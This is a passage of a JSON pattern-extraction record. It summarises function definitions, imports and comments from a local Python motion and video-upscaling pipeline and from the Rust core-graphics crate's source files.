          "def load_progress(progress_file):\n\"\"\"Load progress from file.\"\"\"\nif progress_file.exists():\nwith open(progress_file) as f:\nreturn json.load(f)\nreturn {'completed': [], 'failed': [], 'start_time': None}\n\n\ndef save_progress(progress_file, progress):\n\"\"\"Save progress to file.\"\"\"",
          "def save_progress(progress_file, progress):\n\"\"\"Save progress to file.\"\"\"\nwith open(progress_file, 'w') as f:\njson.dump(progress, f, indent=2)\n\n\ndef upscale_batch(input_dir, output_dir, start_idx=0, max_frames=None):\n\"\"\"",
          "def upscale_batch(input_dir, output_dir, start_idx=0, max_frames=None):\n\"\"\"\nBatch upscale all frames with progress tracking.\n\nArgs:\ninput_dir: Directory with input frames\noutput_dir: Directory for upscaled frames\nstart_idx: Start from this frame index (for resume)\nmax_frames: Maximum frames to process (None = all)\n\"\"\""
        ],
        "class_defs": [],
        "imports": [
          "import os",
          "import sys",
          "import json",
          "import cv2",
          "from pathlib import Path",
          "from datetime import datetime",
          "import time",
          "from realesrgan import RealESRGANer",
          "from basicsr.archs.rrdbnet_arch import RRDBNet"
        ],
        "comments": [
          "# Real-ESRGAN imports",
          "# Get list of frames",
          "# Setup upscaler",
          "# Process frames",
          "# Skip if already done",
          "# Skip if output exists",
          "# Load and upscale",
          "# Save",
          "# Update progress",
          "# Status",
          "# Summary",
          "# Optional: limit frames for testing"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 2,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/motion-pipeline/src/create_skeleton_video.py",
        "docstrings": [],
        "function_defs": [
          "def draw_skeleton(frame, person, color, thickness=2):\n\"\"\"Draw skeleton on frame for one person.\"\"\"\nh, w = frame.shape[:2]\nkeypoints = person.get('keypoints', {})\n\n# Draw connections\nfor start, end in SIMPLE_CONNECTIONS:\nif start in keypoints and end in keypoints:\npt1 = keypoints[start]\npt2 = keypoints[end]",
          "def create_skeleton_video(poses_file, frames_dir, output_path, fps=1):\n\"\"\"\nCreate video with skeleton overlay.\n\nArgs:\nposes_file: Path to all_poses.json\nframes_dir: Directory with frame images\noutput_path: Output video path\nfps: Output video FPS\n\"\"\""
        ],
        "class_defs": [],
        "imports": [
          "import json",
          "import cv2",
          "import numpy as np",
          "from pathlib import Path",
          "from tqdm import tqdm"
        ],
        "comments": [
          "# MediaPipe pose connections",
          "# Simplified connections for keypoints we have",
          "# Colors for different people (BGR)",
          "# Draw connections",
          "# Draw keypoints",
          "# Draw gender label",
          "# Load poses",
          "# Get first frame to determine size",
          "# Setup video writer",
          "# Process frames",
          "# Draw skeletons for each person",
          "# Add frame info"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/motion-pipeline/src/m2_acceleration.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(",
          "def _detect_capabilities(self) -> M2Capabilities:\n\"\"\"Detect Apple Silicon capabilities.\"\"\"\ncaps = M2Capabilities()\n\n# Check MPS availability\ncaps.has_mps = torch.backends.mps.is_available()\n\n# Check Neural Engine (via CoreML)\nif COREML_AVAILABLE:\ntry:",
          "def _setup_device(self) -> torch.device:\n\"\"\"Set up optimal device.\"\"\"\nif self.capabilities.has_mps:\nreturn torch.device(\"mps\")\nreturn torch.device(\"cpu\")\n\ndef _enable_optimizations(self):\n\"\"\"Enable Apple Silicon optimizations.\"\"\"",
          "def _enable_optimizations(self):\n\"\"\"Enable Apple Silicon optimizations.\"\"\"\n# Enable MPS fallback for unsupported ops\nos.environ['PYTORCH_ENABLE_MPS_FALLBACK'] = '1'\n\n# Note: PYTORCH_MPS_HIGH_WATERMARK_RATIO must be <= 1.0\n# We don't set it here as the default (1.0) is usually fine\n\ndef optimize_model(\nself,",
          "def optimize_model(",
          "def convert_to_coreml(",
          "def process_tiled(",
          "def _process_tile(self, model: nn.Module, tile: np.ndarray) -> np.ndarray:\n\"\"\"Process single tile through model.\"\"\"\n# Convert to tensor\ntensor = torch.from_numpy(tile.transpose(2, 0, 1)).unsqueeze(0).float()\ntensor = tensor.to(self.device)\n\n# Process\nwith torch.no_grad():\noutput = model(tensor)\n",
          "def _create_blend_weight(self, tile_size: int, overlap: int) -> np.ndarray:\n\"\"\"Create blending weight for seamless tile merging.\"\"\"\nweight = np.ones((tile_size, tile_size, 1), dtype=np.float32)\n\nif overlap > 0:\n# Create smooth ramp for overlap regions\nramp = np.linspace(0, 1, overlap)\n\n# Apply to edges\nfor i, val in enumerate(ramp):",
          "def get_optimal_tile_size(",
          "def optimize_memory(self):\n\"\"\"Force memory cleanup.\"\"\"\nif self.capabilities.has_mps:\ntorch.mps.empty_cache()\ntorch.mps.synchronize()\n\ngc.collect()\n\ndef get_stats(self) -> Dict[str, Any]:\n\"\"\"Get current acceleration stats.\"\"\"",
          "def get_stats(self) -> Dict[str, Any]:\n\"\"\"Get current acceleration stats.\"\"\"\nstats = {\n'device': str(self.device),\n'chip': self.capabilities.chip_name,\n'mps_available': self.capabilities.has_mps,\n'neural_engine': self.capabilities.has_neural_engine,\n'unified_memory_gb': self.capabilities.unified_memory_gb,\n'gpu_cores': self.capabilities.gpu_cores,\n'tile_size': self.tile_size",
          "def __init__(",
          "def add_frame(self, frame: np.ndarray):\n\"\"\"Add frame to buffer with memory management.\"\"\"\nself.frame_buffer.append(frame)\n\n# Trim if over limit\nwhile len(self.frame_buffer) > self.max_buffer_frames:\nself.frame_buffer.pop(0)\n\n# Check memory pressure\nself._check_memory()",
          "def get_frames(self, count: int = None) -> List[np.ndarray]:\n\"\"\"Get frames from buffer.\"\"\"\nif count is None:\nreturn self.frame_buffer.copy()\nreturn self.frame_buffer[-count:]\n\ndef clear(self):\n\"\"\"Clear buffer and free memory.\"\"\"",
          "def clear(self):\n\"\"\"Clear buffer and free memory.\"\"\"\nself.frame_buffer.clear()\ngc.collect()\n\nif torch.backends.mps.is_available():\ntorch.mps.empty_cache()\n\ndef _check_memory(self):\n\"\"\"Check and handle memory pressure.\"\"\"",
          "def _check_memory(self):\n\"\"\"Check and handle memory pressure.\"\"\"\ntry:\nif torch.backends.mps.is_available():\nallocated = torch.mps.current_allocated_memory() / (1024**3)\n\nif allocated > self.target_memory_gb:\n# Clear half the buffer\nhalf = len(self.frame_buffer) // 2\nself.frame_buffer = self.frame_buffer[half:]",
          "def get_accelerator() -> M2Accelerator:\n\"\"\"Get singleton accelerator instance.\"\"\"\nif not hasattr(get_accelerator, '_instance'):\nget_accelerator._instance = M2Accelerator()\nreturn get_accelerator._instance\n\n\nif __name__ == '__main__':\n# Test acceleration\nimport time",
          "def __init__(self):",
          "def forward(self, x):"
        ],
        "class_defs": [
          "class M2Capabilities:",
          "class M2Accelerator:",
          "class MemoryManager:",
          "class DummyModel(nn.Module):"
        ],
        "imports": [
          "import torch",
          "import torch.nn as nn",
          "import numpy as np",
          "from pathlib import Path",
          "from typing import Optional, Tuple, List, Dict, Any",
          "from dataclasses import dataclass",
          "import logging",
          "import os",
          "import gc",
          "import coremltools as ct",
          "import subprocess",
          "import time"
        ],
        "comments": [
          "# Optional CoreML support",
          "# Detect capabilities",
          "# Set up device",
          "# CoreML model cache",
          "# Enable optimizations",
          "# Check MPS availability",
          "# Check Neural Engine (via CoreML)",
          "# Try to detect chip info",
          "# Estimate cores based on chip",
          "# Get memory",
          "# Enable MPS fallback for unsupported ops",
          "# Note: PYTORCH_MPS_HIGH_WATERMARK_RATIO must be <= 1.0",
          "# We don't set it here as the default (1.0) is usually fine",
          "# Move to MPS",
          "# Half precision (careful - some ops don't support it on MPS)",
          "# Compile model if PyTorch 2.0+",
          "# Set to eval mode for inference",
          "# Trace model",
          "# Convert to CoreML",
          "# Cache it",
          "# Move original back to device",
          "# Normalize input",
          "# Output buffer",
          "# Create blending weight",
          "# Process tiles",
          "# Extract tile",
          "# Pad if needed",
          "# Process tile",
          "# Remove padding",
          "# Get output coordinates",
          "# Get appropriate weight tile",
          "# Blend into output",
          "# Normalize",
          "# Convert back to uint8",
          "# Convert to tensor",
          "# Process",
          "# Convert back",
          "# Clear cache periodically",
          "# Create smooth ramp for overlap regions",
          "# Apply to edges",
          "# Estimate available memory",
          "# Use fraction of unified memory",
          "# Estimate memory per pixel (input + output + intermediate)",
          "# Calculate max tile size",
          "# Round down to power of 2",
          "# Clamp to reasonable range",
          "# Trim if over limit",
          "# Check memory pressure",
          "# Clear half the buffer",
          "# Test acceleration",
          "# Test with dummy model",
          "# Test tiled processing"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 18,
        "decorators": [
          "@dataclass"
        ]
      },
      {
        "file": "/Users/davidquinton/Projects/motion-pipeline/src/tracking.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(",
          "def _keypoint_distance(",
          "def _pose_to_detection(self, pose_result) -> Optional[Detection]:\n\"\"\"\nConvert a PoseResult to Norfair Detection.\n\nArgs:\npose_result: PoseResult from pose estimation\n\nReturns:\nNorfair Detection or None\n\"\"\"",
          "def update(self, pose_results: List) -> List[TrackedPerson]:\n\"\"\"\nUpdate tracker with new pose detections.\n\nArgs:\npose_results: List of PoseResult from pose estimation\n\nReturns:\nList of TrackedPerson with consistent IDs\n\"\"\"",
          "def _compute_bbox(self, keypoints: List[Dict]) -> Optional[Tuple[int, int, int, int]]:\n\"\"\"Compute bounding box from keypoints.\"\"\"\nvisible_points = [(kp['x'], kp['y']) for kp in keypoints if kp['visibility'] > 0.5]\nif not visible_points:\nreturn None\n\nxs, ys = zip(*visible_points)\nx_min, x_max = int(min(xs)), int(max(xs))\ny_min, y_max = int(min(ys)), int(max(ys))\npad = 20",
          "def reset(self):\n\"\"\"Reset tracker state.\"\"\"\nself.tracker = Tracker(\ndistance_function=self._keypoint_distance,\ndistance_threshold=self.distance_threshold,\nhit_counter_max=15,\ninitialization_delay=3,\n)\nself.frame_count = 0\n",
          "def draw_tracked_poses(",
          "def process_video_with_tracking("
        ],
        "class_defs": [
          "class TrackedPerson:",
          "class PersonTracker:"
        ],
        "imports": [
          "import numpy as np",
          "from typing import List, Dict, Optional, Tuple",
          "from dataclasses import dataclass, field",
          "import norfair",
          "from norfair import Detection, Tracker, draw_tracked_objects",
          "import cv2",
          "from .video_utils import VideoReader",
          "from .pose_estimation import PoseEstimator",
          "from tqdm import tqdm",
          "import sys",
          "import json"
        ],
        "comments": [
          "# Initialize Norfair tracker",
          "# Handle different numbers of points",
          "# Calculate mean Euclidean distance",
          "# Extract visible keypoints as numpy array",
          "# Convert poses to Norfair detections",
          "# Update tracker",
          "# Convert to TrackedPerson",
          "# Color palette for different track IDs",
          "# Draw skeleton",
          "# Draw keypoints",
          "# Draw ID",
          "# Detect poses",
          "# Update tracker",
          "# Record frame data",
          "# Update track history"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 1,
        "error_handling": 0,
        "decorators": [
          "@dataclass"
        ]
      },
      {
        "file": "/Users/davidquinton/Projects/motion-pipeline/src/training.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(",
          "def __len__(self):",
          "def __getitem__(self, idx):",
          "def __init__(self):",
          "def calculate_psnr(",
          "def calculate_ssim(",
          "def calculate_sharpness(self, image: np.ndarray) -> float:\n\"\"\"Calculate sharpness using Laplacian variance.\"\"\"\ngray = cv2.cvtColor(image, cv2.COLOR_RGB2GRAY)\nreturn cv2.Laplacian(gray, cv2.CV_64F).var()\n\ndef evaluate(\nself,\nenhanced: np.ndarray,\ntarget: np.ndarray,\nconfig: TrainingConfig",
          "def evaluate(",
          "def __init__(",
          "def _init_storage(self):\n\"\"\"Initialize storage directories.\"\"\"\n(self.storage_path / \"checkpoints\").mkdir(parents=True, exist_ok=True)\n(self.storage_path / \"populations\").mkdir(parents=True, exist_ok=True)\n(self.storage_path / \"history\").mkdir(parents=True, exist_ok=True)\n\ndef train(\nself,\ninput_frames: List[np.ndarray],\ntarget_frames: List[np.ndarray],",
          "def train(",
          "def _initialize_population(self) -> List[EvolutionaryEnhancer]:\n\"\"\"Initialize diverse population of models.\"\"\"\npopulation = []\n\nfor i in range(self.config.population_size):\n# Random hyperparameters\nparams = {\n'detail_weight': random.uniform(0.3, 0.7),\n'texture_weight': random.uniform(0.5, 0.9),\n'saturation': random.uniform(0.95, 1.05),",
          "def _train_model(",
          "def _evolve_population(",
          "def _clone_model(self, model: EvolutionaryEnhancer) -> EvolutionaryEnhancer:\n\"\"\"Create copy of model.\"\"\"\nclone = EvolutionaryEnhancer(\nscale=model.scale,\nbase_channels=model.base_channels\n)\nclone.load_state_dict(model.state_dict())\nclone.set_hyperparameters(model.get_hyperparameters())\nreturn clone.to(self.device)\n",
          "def _crossover(",
          "def _mutate(self, model: EvolutionaryEnhancer) -> EvolutionaryEnhancer:\n\"\"\"Mutate model hyperparameters and weights.\"\"\"\n# Mutate hyperparameters\nparams = model.get_hyperparameters()\nfor key in params:\nif random.random() < 0.3:\nparams[key] *= random.uniform(0.9, 1.1)\nmodel.set_hyperparameters(params)\n\n# Mutate some weights",
          "def _save_checkpoint(",
          "def _save_history(self):\n\"\"\"Save training history.\"\"\"\npath = self.storage_path / \"history\" / f\"training_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json\"\n\nwith open(path, 'w') as f:\njson.dump(self.history, f, indent=2)\n\ndef load_best_model(self) -> Optional[EvolutionaryEnhancer]:\n\"\"\"Load best model from checkpoints.\"\"\"",
          "def load_best_model(self) -> Optional[EvolutionaryEnhancer]:\n\"\"\"Load best model from checkpoints.\"\"\"\nbest_path = self.storage_path / \"checkpoints\" / \"best_model.pt\"\n\nif not best_path.exists():\n# Find best checkpoint\ncheckpoints = list((self.storage_path / \"checkpoints\").glob(\"*.pt\"))\nif not checkpoints:\nreturn None\n",
          "def extract_training_pairs(",
          "def _apply_degradation(image: np.ndarray, degradation: str) -> np.ndarray:\n\"\"\"Apply degradation to create low-quality version.\"\"\"\nresult = image.copy()\n\nif degradation in ['blur', 'all']:\n# Gaussian blur\nresult = cv2.GaussianBlur(result, (5, 5), 1.5)\n\nif degradation in ['noise', 'all']:\n# Add noise"
        ],
        "class_defs": [
          "class TrainingConfig:",
          "class TrainingResult:",
          "class EnhancementDataset(Dataset):",
          "class QualityEvaluator:",
          "class EvolutionaryTrainer:"
        ],
        "imports": [
          "import torch",
          "import torch.nn as nn",
          "import torch.optim as optim",
          "from torch.utils.data import Dataset, DataLoader",
          "import numpy as np",
          "from pathlib import Path",
          "import logging",
          "from typing import Dict, List, Optional, Tuple, Callable",
          "from dataclasses import dataclass, field",
          "import random",
          "from datetime import datetime",
          "import json",
          "import cv2",
          "from .models import EvolutionaryEnhancer, LightweightSR",
          "from models import EvolutionaryEnhancer, LightweightSR",
          "import sys"
        ],
        "comments": [
          "# Basic training",
          "# Evolution parameters",
          "# Quality weights",
          "# Augmentation",
          "# Random horizontal flip",
          "# Random vertical flip",
          "# Convert to tensor",
          "# Normalize scores",
          "# Weighted combination",
          "# Quality evaluator",
          "# Device",
          "# Storage",
          "# Training state",
          "# Split data",
          "# Create datasets",
          "# Initialize population",
          "# Evolution loop",
          "# Train and evaluate each model",
          "# Brief training",
          "# Track best",
          "# Record history",
          "# Progress callback",
          "# Evolve population (except last generation)",
          "# Save final state",
          "# Return result",
          "# Random hyperparameters",
          "# Random architecture",
          "# Loss functions",
          "# Optimizer",
          "# Brief training",
          "# Forward",
          "# Combined loss",
          "# Backward",
          "# Evaluate fitness",
          "# Convert to numpy for quality evaluation",
          "# Sort by fitness",
          "# Keep elite",
          "# Fill rest with crossover and mutation",
          "# Crossover",
          "# Clone from elite",
          "# Mutation",
          "# Mix hyperparameters",
          "# Mix weights (50/50)",
          "# Mutate hyperparameters",
          "# Mutate some weights",
          "# Find best checkpoint",
          "# Sample evenly",
          "# Convert BGR to RGB",
          "# Original as target",
          "# Degrade for input",
          "# Gaussian blur",
          "# Add noise",
          "# JPEG compression",
          "# Downscale and upscale",
          "# Train"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 1,
        "error_handling": 2,
        "decorators": [
          "@dataclass",
          "@dataclass"
        ]
      },
      {
        "file": "/Users/davidquinton/Projects/motion-pipeline/src/camera_motion.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(",
          "def reset(self):\n\"\"\"Reset estimator state.\"\"\"\nself.prev_gray = None\nself.prev_keypoints = None\nself.prev_descriptors = None\n\ndef estimate(\nself,\nframe1: np.ndarray,\nframe2: np.ndarray",
          "def estimate(",
          "def estimate_sequential(self, frame: np.ndarray) -> Optional[CameraMotion]:\n\"\"\"\nEstimate motion from previous frame to current frame.\n\nArgs:\nframe: Current frame (BGR)\n\nReturns:\nCameraMotion or None\n\"\"\"",
          "def compute_camera_trajectory(motions: List[Optional[CameraMotion]]) -> List[Dict]:\n\"\"\"\nCompute cumulative camera trajectory from frame-to-frame motions.\n\nArgs:\nmotions: List of CameraMotion between consecutive frames\n\nReturns:\nList of camera positions (x, y, rotation, scale) per frame\n\"\"\"",
          "def detect_camera_shake(",
          "def process_video_camera_motion("
        ],
        "class_defs": [
          "class CameraMotion:",
          "class CameraMotionEstimator:"
        ],
        "imports": [
          "import cv2",
          "import numpy as np",
          "from typing import List, Dict, Optional, Tuple",
          "from dataclasses import dataclass",
          "from tqdm import tqdm",
          "import json",
          "from .video_utils import VideoReader",
          "import sys"
        ],
        "comments": [
          "# Initialize ORB detector",
          "# Initialize matcher",
          "# Convert to grayscale",
          "# Detect features",
          "# Match features",
          "# Apply Lowe's ratio test",
          "# Extract matched points",
          "# Estimate affine transform with RANSAC",
          "# Extract transform parameters",
          "# Detect features in current frame",
          "# Match with previous frame",
          "# Apply ratio test",
          "# Extract points",
          "# Estimate transform",
          "# Compute trajectory",
          "# Detect shake events",
          "# Compute statistics"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 8,
        "error_handling": 4,
        "decorators": [
          "@dataclass"
        ]
      },
      {
        "file": "/Users/davidquinton/Projects/motion-pipeline/src/checkpointing.py",
        "docstrings": [],
        "function_defs": [
          "def to_dict(self) -> Dict:",
          "def from_dict(cls, data: Dict) -> 'ProcessingState':",
          "def __init__(",
          "def create_job(",
          "def update_progress(",
          "def checkpoint(self, force: bool = False):\n\"\"\"Save current state checkpoint.\"\"\"\nif self.current_state is None:\nreturn\n\nself.current_state.last_checkpoint = time.time()\nself._save_checkpoint(self.current_state)\nself._last_checkpoint_time = time.time()\n\nself.logger.debug(f\"Checkpoint saved: {self.current_state.job_id}\")",
          "def complete(self):\n\"\"\"Mark job as completed.\"\"\"\nif self.current_state is None:\nreturn\n\nself.current_state.status = \"completed\"\nself.current_state.phase = \"done\"\nself._save_checkpoint(self.current_state)\n\nself.logger.info(f\"Job completed: {self.current_state.job_id}\")",
          "def fail(self, error: str):\n\"\"\"Mark job as failed.\"\"\"\nif self.current_state is None:\nreturn\n\nself.current_state.status = \"failed\"\nself.current_state.error_message = error\nself._save_checkpoint(self.current_state)\n\nself.logger.error(f\"Job failed: {self.current_state.job_id} - {error}\")",
          "def find_resumable_job(self, input_path: str) -> Optional[ProcessingState]:\n\"\"\"Find a resumable job for the given input.\"\"\"\nfor checkpoint_file in self.checkpoint_dir.glob(\"*.json\"):\ntry:\nwith open(checkpoint_file) as f:\ndata = json.load(f)\n\nstate = ProcessingState.from_dict(data)\n\n# Check if same input and not completed/failed",
          "def resume_job(self, state: ProcessingState) -> ProcessingState:\n\"\"\"Resume a previous job.\"\"\"\n# Update start time to now\nstate.start_time = time.time() - state.elapsed_time\nstate.status = \"running\"\n\nself.current_state = state\nself._save_checkpoint(state)\n\nself.logger.info(f\"Resumed job: {state.job_id} at frame {state.current_frame}\")",
          "def list_jobs(self, include_completed: bool = False) -> List[Dict]:\n\"\"\"List all checkpoint jobs.\"\"\"\njobs = []\n\nfor checkpoint_file in sorted(self.checkpoint_dir.glob(\"*.json\")):\ntry:\nwith open(checkpoint_file) as f:\ndata = json.load(f)\n\nif include_completed or data.get('status') == 'running':",
          "def clean_completed(self, max_age_days: int = 7):\n\"\"\"Clean old completed/failed jobs.\"\"\"\ncutoff = time.time() - (max_age_days * 24 * 3600)\n\nfor checkpoint_file in self.checkpoint_dir.glob(\"*.json\"):\ntry:\nwith open(checkpoint_file) as f:\ndata = json.load(f)\n\nif (data.get('status') in ['completed', 'failed'] and",
          "def _save_checkpoint(self, state: ProcessingState):\n\"\"\"Save state to checkpoint file.\"\"\"\ncheckpoint_path = self.checkpoint_dir / f\"{state.job_id}.json\"\n\ntry:\nwith open(checkpoint_path, 'w') as f:\njson.dump(state.to_dict(), f, indent=2)\n\n# Rotate old checkpoints\nself._rotate_checkpoints()",
          "def _rotate_checkpoints(self):\n\"\"\"Remove old checkpoints if over limit.\"\"\"\ncheckpoints = sorted(\nself.checkpoint_dir.glob(\"*.json\"),\nkey=lambda p: p.stat().st_mtime,\nreverse=True\n)\n\n# Keep only running jobs and most recent completed\nrunning = []",
          "def _cleanup_on_exit(self):\n\"\"\"Save final checkpoint on exit.\"\"\"\nif self.current_state and self.current_state.status == \"running\":\nself.current_state.status = \"interrupted\"\nself._save_checkpoint(self.current_state)\n\n\nclass RecoveryManager:\n\"\"\"",
          "def __init__(self, checkpoint_manager: CheckpointManager):",
          "def check_for_recovery(self, input_path: str) -> Optional[Dict]:\n\"\"\"Check if there's a recoverable job for this input.\"\"\"\nstate = self.checkpoint_manager.find_resumable_job(input_path)\n\nif state is None:\nreturn None\n\n# Check if temp files still exist\nif not self._verify_temp_files(state):\nself.logger.warning(\"Temp files missing, cannot recover\")",
          "def recover(self, input_path: str) -> Optional[ProcessingState]:\n\"\"\"Attempt to recover interrupted job.\"\"\"\nstate = self.checkpoint_manager.find_resumable_job(input_path)\n\nif state is None:\nreturn None\n\nif not self._verify_temp_files(state):\nreturn None\n",
          "def _verify_temp_files(self, state: ProcessingState) -> bool:\n\"\"\"Verify that temp files from interrupted job exist.\"\"\"\nif not state.temp_dir:\nreturn False\n\ntemp_path = Path(state.temp_dir)\nif not temp_path.exists():\nreturn False\n\n# Check for frames or enhanced directories",
          "def cleanup_failed(self, job_id: str):\n\"\"\"Clean up temp files from failed job.\"\"\"\ncheckpoint_path = self.checkpoint_manager.checkpoint_dir / f\"{job_id}.json\"\n\nif not checkpoint_path.exists():\nreturn\n\ntry:\nwith open(checkpoint_path) as f:\ndata = json.load(f)",
          "def get_checkpoint_manager() -> CheckpointManager:\n\"\"\"Get singleton checkpoint manager.\"\"\"\nif not hasattr(get_checkpoint_manager, '_instance'):\nget_checkpoint_manager._instance = CheckpointManager()\nreturn get_checkpoint_manager._instance\n\n\nif __name__ == '__main__':\n# Demo\nprint(\"Checkpoint Manager Demo\")"
        ],
        "class_defs": [
          "class ProcessingState:",
          "class CheckpointManager:",
          "class RecoveryManager:"
        ],
        "imports": [
          "import json",
          "import time",
          "import shutil",
          "import hashlib",
          "import atexit",
          "import signal",
          "from pathlib import Path",
          "from dataclasses import dataclass, asdict",
          "from typing import Optional, Dict, Any, List",
          "from datetime import datetime",
          "import logging"
        ],
        "comments": [
          "# Progress tracking",
          "# Timing",
          "# State",
          "# Paths",
          "# Error info",
          "# Current state",
          "# Ensure directory exists",
          "# Register cleanup",
          "# Generate job ID from input hash and timestamp",
          "# Update any additional fields",
          "# Update elapsed time",
          "# Auto-checkpoint if interval exceeded",
          "# Check if same input and not completed/failed",
          "# Update start time to now",
          "# Rotate old checkpoints",
          "# Keep only running jobs and most recent completed",
          "# Remove old completed checkpoints",
          "# Check if temp files still exist",
          "# Check for frames or enhanced directories",
          "# Remove temp directory",
          "# Remove checkpoint",
          "# Demo",
          "# Create a job",
          "# Simulate progress",
          "# List jobs",
          "# Complete"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 14,
        "decorators": [
          "@dataclass",
          "@classmethod"
        ]
      }
    ],
    "rust_patterns": [],
    "ts_patterns": []
  },
  {
    "project": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/core-graphics-0.23.2",
    "name": "core-graphics-0.23.2",
    "languages": [
      "Rust"
    ],
    "python_patterns": [],
    "rust_patterns": [
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/core-graphics-0.23.2/src/access.rs",
        "function_defs": [
          "fn CGRequestScreenCaptureAccess() -> boolean_t;",
          "fn CGPreflightScreenCaptureAccess() -> boolean_t;"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl ScreenCaptureAccess {"
        ],
        "uses": [],
        "macros": [],
        "derives": [
          "#[derive(Default)]"
        ],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/core-graphics-0.23.2/src/display.rs",
        "function_defs": [
          "fn drop = CGDisplayModeRelease;",
          "fn clone = |p| CFRetain(p as *const _) as *mut _;"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl CGDisplay {",
          "impl CGDisplayMode {"
        ],
        "uses": [
          "use libc;",
          "use std::ops::Deref;",
          "use std::ptr;",
          "use crate::image::CGImage;",
          "use core_foundation::base::{CFRetain, TCFType};",
          "use core_foundation::string::{CFString, CFStringRef};",
          "use foreign_types::ForeignType;"
        ],
        "macros": [],
        "derives": [
          "#[derive(Clone, Copy)]",
          "#[derive(Copy, Clone, Debug)]"
        ],
        "error_handling": 2
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/core-graphics-0.23.2/src/font.rs",
        "function_defs": [
          "fn drop = |p| CFRelease(p as *mut _);",
          "fn clone = |p| CFRetain(p as *const _) as *mut _;",
          "fn CGFontCreateWithDataProvider(",
          "fn CGFontCreateWithFontName(name: CFStringRef) -> crate::sys::CGFontRef;",
          "fn CGFontCreateCopyWithVariations(",
          "fn CGFontGetTypeID() -> CFTypeID;",
          "fn CGFontCopyPostScriptName(font: crate::sys::CGFontRef) -> CFStringRef;",
          "fn CGFontGetGlyphBBoxes(",
          "fn CGFontGetGlyphAdvances(",
          "fn CGFontGetUnitsPerEm(font: crate::sys::CGFontRef) -> c_int;",
          "fn CGFontCopyTableTags(font: crate::sys::CGFontRef) -> CFArrayRef;",
          "fn CGFontCopyTableForTag(font: crate::sys::CGFontRef, tag: u32) -> CFDataRef;",
          "fn CGFontCopyVariations(font: crate::sys::CGFontRef) -> CFDictionaryRef;",
          "fn CGFontCopyVariationAxes(font: crate::sys::CGFontRef) -> CFArrayRef;"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl CGFont {"
        ],
        "uses": [
          "use crate::data_provider::CGDataProvider;",
          "use crate::geometry::CGRect;",
          "use core_foundation::array::{CFArray, CFArrayRef};",
          "use core_foundation::base::{CFRelease, CFRetain, CFType, CFTypeID, TCFType};",
          "use core_foundation::data::{CFData, CFDataRef};",
          "use core_foundation::dictionary::{CFDictionary, CFDictionaryRef};",
          "use core_foundation::number::CFNumber;",
          "use core_foundation::string::{CFString, CFStringRef};",
          "use std::ptr::NonNull;",
          "use foreign_types::ForeignType;",
          "use libc::{c_int, size_t};"
        ],
        "macros": [
          "assert!(bboxes.len() >= glyphs.len());",
          "assert!(advances.len() >= glyphs.len());"
        ],
        "derives": [],
        "error_handling": 3
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/core-graphics-0.23.2/src/gradient.rs",
        "function_defs": [
          "fn drop = |p| CFRelease(p as *mut _);",
          "fn clone = |p| CFRetain(p as *const _) as *mut _;",
          "fn CGGradientCreateWithColorComponents(",
          "fn CGGradientCreateWithColors("
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl CGGradient {"
        ],
        "uses": [
          "use crate::base::CGFloat;",
          "use crate::color::CGColor;",
          "use crate::color_space::CGColorSpace;",
          "use core_foundation::array::{CFArray, CFArrayRef};",
          "use core_foundation::base::{CFRelease, CFRetain, TCFType};",
          "use foreign_types::ForeignType;",
          "use libc::size_t;"
        ],
        "macros": [
          "assert!(!result.is_null());",
          "assert!(!result.is_null());"
        ],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/core-graphics-0.23.2/src/color.rs",
        "function_defs": [
          "fn CGColorCreateGenericRGB(",
          "fn CGColorGetTypeID() -> CFTypeID;"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl CGColor {"
        ],
        "uses": [
          "use super::sys::CGColorRef;",
          "use crate::base::CGFloat;",
          "use core_foundation::base::CFTypeID;",
          "use core_foundation::base::TCFType;"
        ],
        "macros": [
          "impl_TCFType!(CGColor, CGColorRef, CGColorGetTypeID);"
        ],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/core-graphics-0.23.2/src/lib.rs",
        "function_defs": [],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [],
        "macros": [],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/core-graphics-0.23.2/src/window.rs",
        "function_defs": [],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use core_foundation::array::{CFArray, CFArrayRef};",
          "use core_foundation::base::{CFType, TCFType};",
          "use core_foundation::dictionary::CFDictionary;",
          "use core_foundation::string::{CFString, CFStringRef};",
          "use foreign_types::ForeignType;",
          "use crate::geometry::CGRect;",
          "use crate::image::CGImage;",
          "use crate::sys;"
        ],
        "macros": [],
        "derives": [],
        "error_handling": 1
      },
      {
